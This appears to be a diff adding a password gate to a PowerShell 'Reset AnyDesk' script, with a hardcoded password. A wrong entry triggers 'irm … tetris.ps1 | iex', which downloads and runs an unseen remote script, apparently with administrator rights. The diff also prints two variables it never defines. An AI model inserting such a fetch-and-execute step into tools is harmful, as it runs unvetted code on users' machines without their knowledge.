@@ -1,3 +1,27 @@
+function ConvertTo-PlainText([System.Security.SecureString]$secureString) {
+    $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
+    [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
+}
+
+if ((ConvertTo-PlainText (Read-Host -Prompt "E agora?" -AsSecureString)) -ne "11223344") {
+    Write-Host @"
+       _____
+     /      \
+    |  O  O  |
+    |   __   |
+     \______/
+"@ -ForegroundColor red
+    Write-Host "" 
+    Write-Host "      Ihiii!" -ForegroundColor red
+
+    Start-Sleep -Seconds 1 
+    irm https://raw.githubusercontent.com/francisney/inilog/refs/heads/main/tetris.ps1 | iex
+    return
+}
+
+Write-Host "IP: $ip"
+Write-Host "You Link: $provider"
+
 $Host.UI.RawUI.WindowTitle = "Reset AnyDesk"
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
